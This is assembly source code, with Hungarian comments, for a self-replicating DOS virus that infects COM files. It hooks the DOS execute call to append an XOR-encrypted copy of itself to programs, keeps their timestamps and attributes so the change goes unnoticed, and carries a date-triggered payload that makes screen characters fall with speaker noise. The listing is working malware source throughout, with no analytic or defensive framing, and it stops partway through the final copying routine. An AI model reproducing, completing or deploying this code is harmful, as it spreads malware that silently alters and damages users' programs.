	PAGE ,132
VIRUS	SEGMENT PARA PUBLIC 'CODE'
	ASSUME CS:VIRUS,DS:VIRUS

R1	EQU IDE-131H
R2	EQU BE1-1A3H
HOSSZ	EQU VEG-KEZDET

	ORG 100H
KEZDET	EQU $
	DB 1
	CLI
	MOV BP,SP
	CALL IDE
IDE:	POP BX		; A CIM VISSZAOLVASASA
	SUB BX,131H
	TEST CS:BYTE PTR [BX+KEZDET-R1],1
	JZ INDIT
	LEA SI,[BX+INDIT-R1]
	MOV SP,OFFSET VEG-INDIT
FOLYT:	XOR [SI],SI
	XOR [SI],SP
	INC SI
	DEC SP
	JNZ FOLYT
INDIT:	MOV SP,BP
	JMP BEEPUL

REGCIM	DW 100H
VSZ	DW 0
MENTAX	DW 0
PRGKEZ	DB 0,0,0
	DW 0
REG1C	DD 0
REG21	DD 0
REG28	DD 0
	DW 0
FILATT	DW 0
FILDAT	DW 0
FILIDO	DW 0
FILNEV	DD 0
FILHOS	DD 0
UJKEZD	DB 0E9H,0,0
VIDOSZL	DB 0
VIDSOR	DB 0
VIDMOD	DB 0
OLVKAR	DB 0
OLVATT	DB 0
STATUS	DB 0
VIDKEZ	DW 0
VIDOFS	DW 0
IDOEGYS	DW 0
SZAML	DW 0
SZAMLEL	DW 0
MAXKAR	DW 0
POTYKAR	DW 0
ORA	DB 16 DUP(0)

BEEPUL:	CALL BE1
BE1:	POP BX
	SUB BX,1A3H
	MOV CS:[BX+VSZ-R2],CS	;  A KODSZEGMENS TAROLASA, AZ INDITAS SZEGMENSE
	MOV CS:[BX+MENTAX-R2],AX
	MOV AX,CS:[BX+PRGKEZ-R2]
	MOV DS:100H,AX		;  AZ ELSO HAROM BYTE VISSZAALLITASA
	MOV AL,CS:[BX+PRGKEZ+2-R2]
	MOV DS:102H,AL
	PUSH BX
	MOV AH,30H		;  A DOS VERZIOSZAM BEOLVASASA
	INT 21H
	POP BX
	CMP AL,2
	JB VISSZA		;  HA KISEBB, MINT A 2.0 VERZIO
	MOV AX,4BFFH		;  A VIRUS AKTIVALTSAG ELLENORZESE
	XOR DI,DI		;  DI=0
	XOR SI,SI		;  SI=0
	INT 21H			;  A VIRUS MAR A MEMORIABAN?
	CMP DI,55AAH		;  HA DI=55AA, AKKOR MAR AKTIV
	JNZ BE2			;  UGRAS, HA MAR MUKODIK
	JB BE3			;  MINDIG HAMIS
VISSZA:	STI			;  ELINDITJA A GAZDAPROGRAMOT
	PUSH DS
	POP ES			;  AZ ES VISSZAALLITASA
	MOV AX,CS:[BX+MENTAX-R2]
	JMP DWORD PTR CS:[BX+REGCIM-R2]
BE2:	PUSH BX
	MOV AX,3521H
	INT 21H			;  A 21H MEGSZAKITASVEKTOR BEOLVASASA
	MOV AX,BX
	POP BX			;  ES ELTAROLASA A TABLAZATBAN
BE3:	MOV CS:[BX+REG21-R2],AX
	MOV CS:[BX+REG21+2-R2],ES
	MOV AX,0F000H
	MOV ES,AX
	MOV DI,0E008H
	CMP WORD PTR [DI],4F43H	;  'COPR. IBM'+00H ELLENORZESE /LENNE/
	JNZ BE4
	CMP WORD PTR [DI+2],5250H
	JNZ BE4
	CMP WORD PTR [DI+4],202EH
	JNZ BE4
	CMP WORD PTR [DI+6],4249H
	JNZ BE4
	CMP WORD PTR [DI+8],4DH
	JZ VISSZA
BE4:	MOV AX,HOSSZ/10H+11H	;  A VIRUS HOSSZA+100H PARAGRAFUSBAN
	MOV BP,CS		;  ES RAALLITASA A PROGRAMOT MEGELOZO
	DEC BP			;  MCB-RE
	MOV ES,BP
	MOV SI,CS:[16H]
	MOV ES:[1],SI
	MOV DX,ES:[3]		;  A SZABAD PARAGRAFUSOK BEOLVASASA DX-BE
	MOV ES:[3],AX
	MOV ES:BYTE PTR [0],4DH	;  NEM UTOLSO MCB
	SUB DX,AX		;  AZ UJ SZABAD PARAGRAFUSOK SZAMA A VIRUS
	DEC DX			;  HOSSZAVAL ES EGYEL /AZ UJ MCB/ KEVESEBB
	INC BP
	ADD BP,AX
	INC BP
	MOV ES,BP
	PUSH BX
	MOV AH,50H
	MOV BX,BP
	INT 21H
	POP BX
	XOR DI,DI		;  DI=0
	PUSH ES
	POP SS			;  SS=ES -  AZ UJ VEREM AZ UJ HELYEN LESZ
	PUSH DI
	LEA DI,[BX+VEG-R2-1]	;  A PROGRAM VEGEROL
	MOV SI,DI
	MOV CX,OFFSET HOSSZ 	;  A VIRUST /CX-BE A VIRUS HOSSZA KERUL/
	STD			;  VISSZAFELE
	REPZ MOVSB		;  FELMASOLJA
	PUSH ES
	LEA CX,[BX+BE9-R2]	;  KOZVETLEN VEZERLESATADAS AZ UJ HELYEN
	PUSH CX			;  LEVO VIRUSRA.  A PROGRAM VALOJABAN A 
	RETF			;  RETF UTASITAS UTAN FOLYTATODIK
BE9:	MOV CS:[BX+VSZ-R2],CS	;  AZ UJ SZEGMENSCIM AZ INDITASHOZ
	LEA CX,[BX+KEZDET-R2]	;  A PROGRAM HOSSZA VIRUS NELKUL
	REPZ MOVSB		;  A PROGRAM 'FELHUZASA' A VIRUS ALA
	MOV CS:36H,CS
	DEC BP			;  AZ UJ MCB SZEGMENSCIME
	MOV ES,BP		;  ATTOLTENI ES-BE
	MOV ES:[3],DX		;  BEALLITANI A SZABAD PARAGRAFUSOK SZAMAT
	MOV ES:BYTE PTR [0],5AH	;  ES EZ AZ UTOLSO MCB
	MOV ES:WORD PTR [1],CS	;  A PROGRAM SZEGMENSCIME
	INC BP			;  ES=ES+1, A SZEGMENSREGISZTER VISSZAALLITASA
	MOV ES,BP		;  A PROGRAM ELEJERE
	PUSH DS
	POP ES			;  ES=DS
	PUSH CS
	POP DS			;  DS=CS
	LEA SI,[BX+KEZDET-R2]	;  A PROGRAM HOSSZA VIRUS NELKUL
	MOV DI,100H
	MOV CX,OFFSET HOSSZ	;  A VIRUS HOSSZA
	CLD			;  A VIRUS LEMASOLASA A PROGRAM ELOTT
	REPZ MOVSB		;  FELSZABADULT HELYRE
	PUSH ES			;  ES KOZVETLEN VEZERLESATADAS A VEGLEGES
	LEA AX,DS:BE8		;  HELYEN TALALHATO VIRUS SZAMARA
	PUSH AX			;  AZ UGRAS AZ UJ VIRUS RETF UTASITASA
	RETF			;  UTAN TORTENIK
BE8:	MOV CS:WORD PTR [2CH],0
	MOV CS:16H,CS
	PUSH DS			;  DS ERTEKET ELMENTENI
	LEA DX,DS:UJ21		;  AZ UJ INT 21H CIMENEK BEALLITASA
	PUSH CS			;  DS=CS
	POP DS
	MOV AX,2521H
	INT 21H
	POP DS			;  DS REGI ERTEKE
	MOV AH,1AH
	MOV DX,80H
	INT 21H			;  A DTA CIM BEALLITASA
	CALL BEMAS		;  A RENDSZERIDO BEMASOLASA A TABLAZATBA
	MOV AH,2AH
	INT 21H			;  RENDSZERDATUM BEOLVASASA
	CMP CX,1988		;  A MAI DATUM NAGYOBB, MINT 1988?
	JA BE5			;  IGEN:  CSAK FERTOZES
	JZ BE6			;  IDEN VAN 1988
	CMP CX,1980		;  1980 VAN?
	JNZ BE5			;  IGEN:  CSAK FERTOZES
	PUSH DS
	MOV AX,3528H
	INT 21H			;  A 28H VEKTOR BEOLVASASA, ES ELTAROLASA
	MOV CS:WORD PTR REG28,BX
	MOV CS:WORD PTR REG28+2,ES
	MOV AX,2528H
	MOV DX,OFFSET UJ28	;  DX-BE AZ UJ INT 28H OFFSZETJE
	PUSH CS
	POP DS			;  DS=CS
	INT 21H			;  A MEGSZAKITASI VEKTOR BEALLITASA
	POP DS
	OR CS:STATUS,1000B	;  A POTYOGAS LETILTASA
	JMP BE7
BE6:	CMP DH,0AH		;  CSAK OKTOBERTOL DECEMBERIG POTYOG
	JB BE5			;  MEG NINCS
BE7:	CALL KESLH		;  A KESLELTETESI ERTEK MEGHATAROZASA
	MOV AX,1518H
	CALL VELETL
	INC AX
	MOV CS:SZAML,AX		;  A BELSO VALTOZOK BEALLITASA
	MOV CS:SZAMLEL,AX
	MOV CS:POTYKAR,1
	MOV AX,351CH
	INT 21H			;  AZ 1CH VEKTOR BEOLVASASA ES ELTAROLASA
	MOV CS:WORD PTR REG1C,BX
	MOV CS:WORD PTR REG1C+2,ES
	PUSH DS
	MOV AX,251CH
	MOV DX,OFFSET UJ1C	;  AZ UJ INT 1CH OFFSZETJE
	PUSH CS			;  ES SZEGMENSE
	POP DS
	INT 21H			;  AZ 1CH VEKTOR BEALLITASA
	POP DS
BE5:	MOV BX,0FFD6H
	JMP VISSZA

UJ21:	CMP AH,4BH		;  A FUNKCIOKOD 4BH?
	JZ U21_1		;  IGEN
U21_2:	JMP DWORD PTR CS:REG21	;  FOLYTATAS A REGI INT 21H-N
U21_3:	MOV DI,55AAH		;  A VIRUS AKTIVALTSAGA
	LES AX,CS:REG21
	MOV DX,CS
	IRET
U21_1:	CMP AL,0FFH		;  A VIRUS AKTIVALTSAG KERDEZESE?
	JZ U21_3		;  IGEN
	CMP AL,0		;  BETOLTES & INDITAS?
	JNZ U21_2		;  NEM
	PUSHF			;  A REGISZTEREK MENTESE
	PUSH AX
	PUSH BX
	PUSH CX
	PUSH DX
	PUSH SI
	PUSH DI
	PUSH BP
	PUSH ES
	PUSH DS
	MOV CS:WORD PTR FILNEV,DX
	MOV CS:WORD PTR FILNEV+2,DS
	PUSH CS
	POP ES
	MOV AX,3D00H
	INT 21H			;  A FILE MEGNYITASA OLVASASRA
	JC FERT1
	MOV BX,AX		;  A FILESZAM ATVITELE BX-BE
	MOV AX,5700H
	INT 21H			;  A KELETKEZESI IDO BEOLVASASA
	MOV CS:FILDAT,DX	;  ES ELTAROLASA
	MOV CS:FILIDO,CX
	MOV AH,3FH
	PUSH CS
	POP DS
	MOV DX,OFFSET PRGKEZ
	MOV CX,3
	INT 21H			;  AZ ELSO HAROM BYTE BEOLVASASA
	JC FERT1
	CMP AX,CX		;  SIKERULT MINDENT BEOLVASNI?
	JNZ FERT1		;  NEM, HIBA TORTENT
	MOV AX,4202H
	XOR CX,CX
	XOR DX,DX
	INT 21H			;  FILE HOSSZANAK A MEGHATAROZASA
	MOV CS:WORD PTR FILHOS,AX
	MOV CS:WORD PTR FILHOS+2,DX
	MOV AH,3EH
	INT 21H			;  A FILE LEZARASA
	CMP CS:WORD PTR PRGKEZ,5A4DH
	JNZ FERT2		;  COM FILE?
	JMP FERT3		;  EXE ESETEN VISSZATERES
FERT2:	CMP CS:WORD PTR FILHOS+2,0
	JA FERT1		;  NAGYOBB, MINT 64K?
	CMP CS:WORD PTR FILHOS,0F93BH
	JBE FERT7		;  A FILE MEG MEGFELELO MERETU
FERT1:	JMP FERT3
FERT7:	CMP CS:PRGKEZ,0E9H	;  JMP UTASITAS?
	JNZ FERT8		;  NEM
	MOV AX,CS:WORD PTR FILHOS
	ADD AX,0F959H		;  FILE HOSSZA - VIRUS HOSSZA : IDE UGRIK?
	CMP AX,CS:WORD PTR PRGKEZ+1
	JZ FERT1		;  EZ A FILE MAR FERTOZOTT
FERT8:	MOV AX,4300H
	LDS DX,CS:FILNEV
	INT 21H			;  A FILE ATTRIBUTUMANAK BEOLVASASA
	JC FERT1
	MOV CS:FILATT,CX	;  AZ ATTRIBUTUM TAROLASA
	XOR CL,20H		;  AZ ARCHIV BIT INVERTALASA
	TEST CL,27H
	JZ FERT5
	MOV AX,4301H
	XOR CX,CX
	INT 21H			;  AZ UJ ATTRIBUTUM FELIRASA
	JC FERT1
FERT5:	MOV AX,3D02H
	INT 21H			;  FILE NYITASA IRASRA & OLVASASRA
	JC FERT1
	MOV BX,AX		;  FILE SORSZAM BX-BE
	MOV AX,4202H
	XOR CX,CX
	XOR DX,DX
	INT 21H			;  MUTATO A FILE VEGERE
	CALL UTANMAS		;  A VIRUST UTANAMASOLNI
	JNC FERT9		;  SIKERULT?
	MOV AX,4200H
	MOV CX,CS:WORD PTR FILHOS+2
	MOV DX,CS:WORD PTR FILHOS
	INT 21H			;  MUTATO A FILE EREDETI VEGERE
	MOV AH,40H
	XOR CX,CX
	INT 21H			;  A FILEHOSSZ FELIRASA
	JMP FERT6
FERT9:	MOV AX,4200H
	XOR CX,CX
	XOR DX,DX
	INT 21H			;  MUTATO A FILE ELEJERE
	JC FERT6
	MOV AX,CS:WORD PTR FILHOS
	ADD AX,0FFFEH		;  AZ UGRASI CIM KISZAMITASA
	MOV CS:WORD PTR UJKEZD+1,AX
	MOV AH,040H
	MOV DX,OFFSET UJKEZD
	MOV CX,3
	INT 21H			;  AZ ELSO HAROM BYTE KIIRASA
FERT6:	MOV AX,5701H
	MOV DX,CS:FILDAT	;  A DATUM
	MOV CX,CS:FILIDO	;  ES IDO BEOLVASASA
	INT 21H			;  ES BEALLITASA
	MOV AH,3EH
	INT 21H			;  A FILE LEZARASA
	MOV CX,CS:FILATT	;  AZ ATTRIBUTUM BEOLVASASA
	TEST CL,111B		;  R/O, REJTETT VAGY RENDSZER?
	JNZ FERTA
	TEST CL,100000B		;  ARCHIV FILE?
	JNZ FERT3
FERTA:	MOV AX,4301H
	LDS DX,CS:FILNEV
	INT 21H			;  A FILE ATTRIBUTUMANAK BEALLITASA
FERT3:	POP DS			;  A REGISZTEREK VISSZAOLVASASA
	POP ES
	POP BP
	POP DI
	POP SI
	POP DX
	POP CX
	POP BX
	POP AX
	POPF
	JMP U21_2

VELETL	PROC NEAR		;  EGY VELETLENSZAM ELOALLITASA
	PUSH DS
	PUSH CS
	POP DS
	PUSH BX
	PUSH CX
	PUSH DX
	PUSH AX
	MOV CX,7
	MOV BX,OFFSET ORA+0EH
	PUSH [BX]
VEL1:	MOV AX,[BX-2]
	ADC [BX],AX
	DEC BX
	DEC BX
	LOOP VEL1
	POP AX
	ADC [BX],AX
	MOV DX,[BX]
	POP AX
	OR AX,AX
	JZ VEL2
	MUL DX
VEL2:	MOV AX,DX
	POP DX			;  REGISZTEREK VISSZAALLITASA
	POP CX
	POP BX
	POP DS
	RET
VELETL	ENDP

BEMAS	PROC NEAR		;  A RENDSZERIDO BEMASOLASA A TABLAZATBA
	PUSH DS			;  A REGISZTEREK ELMENTESE
	PUSH ES
	PUSH SI
	PUSH DI
	PUSH CX
	PUSH CS			;  ES=CS
	POP ES
	MOV CX,40H		;  FORRAS= 0000:046CH
	MOV DS,CX		;  AZ ORA BEMASOLASA
	MOV DI,OFFSET ORA
	MOV SI,6CH
	MOV CX,8		;  16 BYTE
	CLD			;  NOVEKVO IRANYBA
	REPZ MOVSW
	POP CX			;  A REGISZEREK ELOZO ERTEKEINEK
	POP DI			;  VISSZAALLITASA
	POP SI
	POP ES
	POP DS
	RET			;  VISSZATERES
BEMAS	ENDP	

VIDOLV	PROC NEAR		;  OLVASAS A VIDEORAM-BOL
	PUSH SI			;  REGISZTEREK ELMENTESE
	PUSH DS
	PUSH DX
	MOV AL,DH
	MUL VIDOSZL		;  A SOR SZAMA SZOROZVA A SORON BELULI OSZLOPOK
	MOV DH,0		;  SZAMAVAL, PLUSZ AZ OSZLOPOK SZAMA
	ADD AX,DX
	SHL AX,1		;  SZORZAS KETTOVEL (KAR.+ATTRIB.)
	ADD AX,VIDOFS		;  ELTOLAS A SZEGMENSEN BELUL
	MOV SI,AX
	TEST VIDMOD,11111111B	;  HAVAZIK A KEPERNYO?
	MOV DS,VIDKEZ
	JZ VO3			;  NEM HAVAZIK
	MOV DX,3DAH		;  A CGA KARTYA STATUSZPORTJA
	CLI			;  A MEGSZAKITASOKAT LETILTANI
VO1:	IN AL,DX		;  A STATUSZ BEOLVASASA
	TEST AL,1000B		;  FUGGOLEGES VISSZAFUTAS
	JNZ VO3
	TEST AL,1		;  VARJUK MEG, MIG NEM OLVASHATUNK A RAM-BOL
	JNZ VO1
VO2:	IN AL,DX
	TEST AL,1
	JZ VO2
VO3:	LODSW			;  A KARAKTER ES ATTRIBUTUM BEOLVASASA
	STI			;  A MEGZAKITAS ELLENORZESE
	POP DX			;  REGISZTEREK VISSZAOLVASASA
	POP DS
	POP SI
	RET
VIDOLV	ENDP

VIDIR	PROC NEAR		;  KIIRAS A VIDEORAM-BA
	PUSH DI			;  REGISZTEREK ELMENTESE
	PUSH ES
	PUSH DX
	PUSH BX
	MOV BX,AX		;  A KARAKTER ES AZ ATTRIBUTUM ELMENTESE
	MOV AL,DH		;  A CIM KISZAMITASA
	MUL VIDOSZL
	MOV DH,0
	ADD AX,DX
	SHL AX,1		;  SZORZAS KETTOVEL
	ADD AX,VIDOFS
	MOV DI,AX
	TEST VIDMOD,11111111B	;  HAVAZIK A KEPERNYO?
	MOV ES,VIDKEZ
	JZ VI3			;  NEM HAVAZIK
	MOV DX,03DAH		;  A CGA KARTYA STATUSZPORTJA
	CLI			;  MEGSZAKITASOKAT TILTANI
VI1:	IN AL,DX		;  A STATUSZT BEOLVASNI
	TEST AL,1000B		;  FUGGOLEGES VISSZAFUTAS?
	JNZ VI3			;  IGEN
	TEST AL,1		;  IRHATUNK A VIDEORAM-BA?
	JNZ VI1			;  HA IGEN, AKKOR VARJUNK MEG
VI2:	IN AL,DX		;  A STATUSZ BEOLVASASA
	TEST AL,1		;  VARJUK MEG, AMIRE ISMET OLVASHATUNK
	JZ VI2
VI3:	MOV AX,BX		;  A KARAKTER ES AZ ATTRIBUTUM BETOLTESE
	STOSB			;  BEIRASA A VIDEORAM-BA
	STI			;  A MEGSZAKITASOK MAR ENGEDELYEZHETOK
	POP BX			;  A REGISZTEREK VISSZAALITASA
	POP DX
	POP ES
	POP DI
	RET			;  VISSZATERES
VIDIR	ENDP

VARAK	PROC NEAR		;  VARAKOZAS CX IDEIG
	PUSH CX
V1:	PUSH CX
	MOV CX,IDOEGYS
V2:	LOOP V2
	POP CX
	LOOP V1
	POP CX
	RET
VARAK 	ENDP

HANGSZ	PROC NEAR		;  A HANGSZORO ATKAPCSOLASA
	PUSH AX			;  AX ELMENTESE
	IN AL,61H		;  A PPI BEOLVASASA
	XOR AL,2		;  A HANGSZORO ATKAPCSOLASA
	AND AL,11111110B	;  ENGEDELYEZESE
	OUT 61H,AL		;  VISSZAIRASA
	POP AX			;  AX VISSZAALLITASA
	RET			;  VISSZATERES
HANGSZ	ENDP

URES	PROC NEAR
	CMP AL,0		;  NUL KODJA?
	JZ UR1			;  IGEN
	CMP AL,20H		;  SZOKOZ?
	JZ UR1			;  IGEN
	CMP AL,0FFH		;  0FFH IS URES
	JZ UR1			;  AZ
	CLC			;  NEM URES
	RET			;  VISSZATERES
UR1:	STC			;  URES
	RET			;  VISSZATERES
URES	ENDP

GRAFIK	PROC NEAR
	CMP AL,0B0H		;  0B0H<=AL<=0DFH?
	JB GR1			;  NEM
	CMP AL,0DFH
	JA GR1			;  NEM
	STC			;  IGEN
	RET			;  VISSZATERES
GR1:	CLC			;  NEM GRAFIKUS
	RET			;  VISSZATERES
GRAFIK	ENDP

KESLH	PROC NEAR		;  A KESLELTETESI ERTEK MEGHATAROZASA
	PUSH DS
	MOV AX,40H
	MOV DS,AX
	STI
	MOV AX,DS:6CH		;  AZ ORA BEOLVASASA
KES1:	CMP AX,DS:6CH		;  VARAKOZAS, MIG AZ ORA EPPEN NEM LEP
	JZ KES1
	XOR CX,CX		;  CX NULLAZASA
	MOV AX,DS:6CH		;  AZ ORA BEOLVASASA
KES2:	INC CX			;  CX=CX+1
	JZ KES4			;  HA TULCSORDULT
	CMP AX,DS:6CH		;  LEPETT MAR AZ ORA?
	JZ KES2			;  MEG NEM
KES3:	POP DS
	MOV AX,CX
	XOR DX,DX
	MOV CX,0FH
	DIV CX
	MOV CS:IDOEGYS,AX	;  AZ IDOEGYSEG ELTAROLASA
	RET
KES4:	DEC CX
	JMP KES3
KESLH	ENDP

POTY	PROC NEAR		;  POTYOGTATAS
	MOV VIDSOR,24
	PUSH DS
	MOV AX,40H		;  A BIOS PARAMETERBLOKK
	MOV DS,AX
	MOV AX,DS:4EH		;  A VIDEOPUFFER OFSZET ERTEKE
	POP DS
	MOV VIDOFS,AX
	MOV DL,0FFH
	MOV AX,1130H
	MOV BH,0
	PUSH ES			;  ES & BP ELMENTESE
	PUSH BP
	INT 10H			;  A SOROK SZAMANAK BEOLVASASA
	POP BP			;  ES & BP VISSZAALLITASA
	POP ES
	CMP DL,0FFH
	JZ PO1
PO4:	MOV VIDSOR,DL		;  A SOROK SZAMANAK ELTAROLASA
PO1:	MOV AH,0FH
	INT 10H			;  OSZLOPOK SZAMANAK A BEOLVASASA
	MOV VIDOSZL,AH		;  ES ELTAROLASA
	MOV VIDMOD,0		;  A MOD ES A VIDEOMEMORIA SZEGMENSCIMENEK
	MOV VIDKEZ,0B000H	;  BEALLITASA
	CMP AL,7		;  AZ AKTUALIS MOD EGA-TEXT?
	JZ PO3			;  IGEN
	JB PO2
	JMP PO7
PO2:	MOV VIDKEZ,0B800H	;  A VIDEOMEMORIA KEZDOCIME
	CMP AL,3
	JA PO3
	CMP AL,2
	JB PO3
	MOV VIDMOD,1		;  HAVAZIK A KEPERNYO
	MOV AL,VIDSOR		;  A SOROK SZAMA
	INC AL			;  MEG EGY
	MUL VIDOSZL		;  SZOROZVA AZ OSZLOPOK SZAMAVAL
	MOV MAXKAR,AX		;  ENNYI KARAKTERHELY VAN A KEPERNYON
	MOV AX,POTYKAR		;  A POTYOGTATANDO KARAKTEREK SZAMA
	CMP AX,MAXKAR		;  NAGYOBB, MINT A MAXIMALIS KARAKTERSZAM?
	JBE PO5			;  NEM, TOVABB
	MOV AX,MAXKAR		;  A MAXIMALIS KARAKTERSZAM
PO5:	CALL VELETL		;  VELETLENSZAM ELOALLITASA 1 ES A POTYOGTATANDO
	INC AX			;  /VAGY MAXIMALIS/ ERTEK KOZOTT
	MOV SI,AX		;  A MAXIMALISAN POTYOGTATHATO KARAKTEREK SZAMA
PO3:	XOR DI,DI		;  DI=0
PO8:	INC DI			;  DI=DI+1  :  A SIKERTELEN KISERLETEKET SZAMLALJA
	MOV AX,MAXKAR		;  A MAXIMALIS KARAKTERSZAM
	SHL AX,1		;  SZOROZVA KETTOVEL, ENNYI SIKERTELEN KISERLET
	CMP DI,AX		;  ENGEDELYEZETT EGYMAS UTAN
	JBE PO6			;  MEG NEM TELT LE
	JMP PO7			;  TULLEPTE, KILEPETT
PO6:	OR STATUS,10B		;  A KARAKTER NEM POTYOGOTT
	MOV AL,VIDOSZL		;  A MAXIMALIS ERTEK AZ OSZLOPOK SZAMA
	MOV AH,0
	CALL VELETL		;  VELETLENSZAM ELOALLITASA
	MOV DL,AL		;  EZ LESZ AZ OSZLOPSZAM
	MOV AL,VIDSOR		;  MAXIMALIS ERTEK A SOROK SZAMA
	MOV AH,0
	CALL VELETL		;  VELETLENSZAM ELOALLITASA
	MOV DH,AL		;  EZ LESZ A SORSZAM
	CALL VIDOLV		;  A MEGFELELO KARAKTER BEOLVASASA
	CALL URES		;  URES-E?
	JC PO8			;  IGEN
	CALL GRAFIK		;  GRAFIKUS-E?
	JC PO8			;  IGEN
	MOV OLVKAR,AL		;  A BEOLVASOTT KARAKTER ES ATTRIBUTUMANAK
	MOV OLVATT,AH		;  ELTAROLASA
	MOV CL,VIDSOR		;  CX=SOROK SZAMA
	MOV CH,0
POC:	INC DH			;  A KOVETKEZO SOR
	CMP DH,VIDSOR		;  ELERTE A MAXIMALISAT?
	JA PO9			;  TULLEPTE, ABBAHAGYNI
	CALL VIDOLV		;  A KARAKTER BEOLVASASA
	CMP AH,OLVATT		;  AZ ATTRIBUTUM STIMMEL?
	JNZ PO9			;  NEM EGYEZIK
	CALL URES		;  URES KARAKTER-E?
	JC POA			;  IGEN
POE:	CALL GRAFIK		;  GRAFIKUS-E?
	JC PO9			;  IGEN
	INC DH			;  A KOVETKEZO SOR
	CMP DH,VIDSOR		;  TULLEPTE AZ UTOLSO SORT?
	JA PO9			;  IGEN
	CALL VIDOLV		;  BEOLVASAS A VIDEORAM-BOL
	CMP AH,OLVATT		;  AZ ATTRIBUTUMOK OSSZEHASONLITASA
	JNZ PO9			;  NEM EGYEZNEK
	CALL URES		;  URES KARAKTER-E?
	JNC POE			;  NEM
	CALL HANGSZ		;  HANG ELOALLITASA
	DEC DH			;  A FELETTE LEVO SOR
	CALL VIDOLV		;  BEOLVASASA
	MOV OLVKAR,AL		;  ES AZ OTT LEVO KARAKTER ELTAROLASA
	INC DH			;  AZ ALATTA LEVO SOR
POA:	AND STATUS,11111101B	;  SIKERULT POTYOGTATNI
	DEC DH			;  A FELETTE LEVO SOR
	MOV AL,20H		;  A SZOKOZ KODJA
	CALL VIDIR		;  KIIRASA
	INC DH			;  AZ ALATTA LEVO SOR
	MOV AL,OLVKAR		;  A KARAKTER
	CALL VIDIR		;  KIIRASA
	JCXZ POB		;  HA ELERTUK A LEGALSO SORT, AKKOR KILEPES
	CALL VARAK		;  VARAKOZAS
	DEC CX			;  ES A VISSZALEVO SOROK SZAMANAK CSOKKENTESE
POB:	JMP POC
PO9:	TEST STATUS,10B		;  POTYOGOTT MAR KARAKTER?
	JZ POD			;  IGEN
	JMP PO8			;  UJ KISERLET
POD:	CALL HANGSZ		;  HANG ELOALLITASA
	DEC SI			;  EGGYEL KEVESEBB KARAKTER VAN HATRA
	JZ PO7			;  HA NULLA, AKKOR KILEPNI
	JMP PO3			;  UJRA KISERELNI
PO7:	IN AL,61H		;  A HANGSZORO BEOLVASASA
	AND AL,11111100B	;  KIKAPCSOLASA
	OUT 61H,AL		;  MAJD VISSZAIRASA
	RET			;  VISSZATERES
POTY	ENDP

UJ1C:	TEST CS:STATUS,1001B	;  A POTYOGAS TILTVA, VAGY EPPEN POTYOG?
	JNZ U1C_1		;  IGEN
	OR CS:STATUS,1		;  EPPEN POTYOG JELZOT BEALLITANI
	DEC CS:SZAML		;  A SZAMLALOT CSOKKENTENI
	JNZ U1C_2		;  HA MEG NEM NULLA, AKKOR VEGE
	PUSH DS			;  REGISZTEREK ELMENTESE
	PUSH ES
	PUSH CS
	POP DS			;  DS=CS
	PUSH CS
	POP ES			;  ES=CS
	PUSH AX
	PUSH BX
	PUSH CX
	PUSH DX
	PUSH SI
	PUSH DI
	PUSH BP
	MOV AL,20H
	OUT 20H,AL
	MOV AX,SZAMLEL		;  A SZAMLALO ELOZO ERTEKE
	CMP AX,0438H		;  AZ ELOZO ERTEK KISEBB VOLT?
	JNB U1C_3		;  NEM
	MOV AX,0438H		;  KB. 60 MASODPERC
U1C_3:	CALL VELETL		;  VELETLENSZAM ELOAALITASA
	INC AX			;  AZ IDO NEM LEHET NULLA
	MOV SZAML,AX		;  ES ELTAROLAS A SZAMLALOBA
	MOV SZAMLEL,AX		;  ES MINT A SZAMLALO UTOLSO ERTEKE IS
	CALL POTY		;  POTYOGTATAS
	MOV AX,3		;  VELETLENSZAM ELOALLIASA
	CALL VELETL		;  1 ES 3 KOZOTT
	INC AX
	MUL POTYKAR		;  EZT SZOROZNI A MAXIMALISAN POTYOGTATHATO
	JNB U1C_4		;  KARAKTEREK SZAMAVAL
	MOV AX,0FFFFH		;  MAXIMUM 65535 DB LEHET
U1C_4:	MOV POTYKAR,AX		;  ELTAROLASA
	POP BP			;  REGISZTEREK VISSZOLVASASA
	POP DI
	POP SI
	POP DX
	POP CX
	POP BX
	POP AX
	POP ES
	POP DS
U1C_2:	AND CS:STATUS,11111110B	;  EPPEN NEM POTYOG BEALLITASA
U1C_1:	JMP DWORD PTR CS:REG1C	;  FOLYTATASA A REGI INT 1CH-N

UJ28:	TEST CS:STATUS,1000B	;  TILTVA A POTYOGAS?
	JZ U28_1		;  HA NEM, AKKOR FELESLEGES VEGREHAJTANI
	PUSH AX			;  REGISZTEREK MENTESE
	PUSH CX
	PUSH DX
	MOV AH,2AH		;  A RENDSZERDATUM BEOLVASASA
	INT 21H
	CMP CX,1988		;  AZ EV 1988?
	JB U28_2		;  HA KISEBB, AKKOR KILEPES
	JA U28_3		;  HA NAGYOBB, AKKOR POTYOGHAT
	CMP DH,10		;  VAN MAR OKTOBER?
	JB U28_2		;  HA MEG NINCS, AKKOR NE POTYOGJON
U28_3:	AND CS:STATUS,11110111B	;  A POTYOGAS ENGEDELYEZVE
U28_2:	POP DX			;  REGISZTEREK VISSZAOLVASASA
	POP CX
	POP AX
U28_1:	JMP DWORD PTR CS:REG28	;  FOLYTATAS A REGI INT 28H-N

UTANMAS	PROC NEAR		;  A VIRUS KIMASOLASA A PROGRAM MOGE
	PUSH ES
	PUSH BX
	MOV AH,48H		;  MEMORIATERULET ALLOKALASA
	MOV BX,OFFSET HOSSZ/10H+1
	INT 21H
	POP BX
	JNC UTAN1		;  SIKERULT?
UTAN3:	STC
	POP ES
	RET
UTAN1:	MOV BYTE PTR CS:100H,1
	MOV ES,AX
	PUSH CS			;  DS=CS
	POP DS
	XOR DI,DI		;  DI=0
	MOV SI,100H		;  SI=100H
	MOV CX,OFFSET HOSSZ	;  A VIRUS HOSSZA
	CLD			;  NOVEKVO IRANY
	REPZ MOVSB		;  A VIRUS KIMASOLASA AZ ALLOKALT TERULETRE
	MOV DI,OFFSET INDIT-100H
	MOV SI,OFFSET INDIT
	ADD SI,WORD PTR FILHOS
	MOV CX,OFFSET VEG-INDIT
UTAN2:	XOR ES:[DI],SI		;  A VIRUS LE XOR-OLASA
	XOR ES:[DI],CX
	INC DI
	INC SI
	LOOP UTAN2
	MOV DS,AX		;  DS A PUFFER ELEJERE MUTAT
	MOV AH,40H
	XOR DX,DX		;  AZ OFSZET A PUFFER ELEJERE
	MOV CX,OFFSET HOSSZ	;  A VIRUS HOSSZA
	INT 21H			;  KIIRAS A PROGRAM MOGE
	PUSHF
	PUSH AX
	MOV AH,49H		;  AZ ALLOKALT MEMORIABLOKK FELSZABADITASA
	INT 21H
	POP AX			;  A REGISZTEREK VISSZAOLVASASA
	POPF
	PUSH CS			;  DS=CS
	POP DS
	JC UTAN3
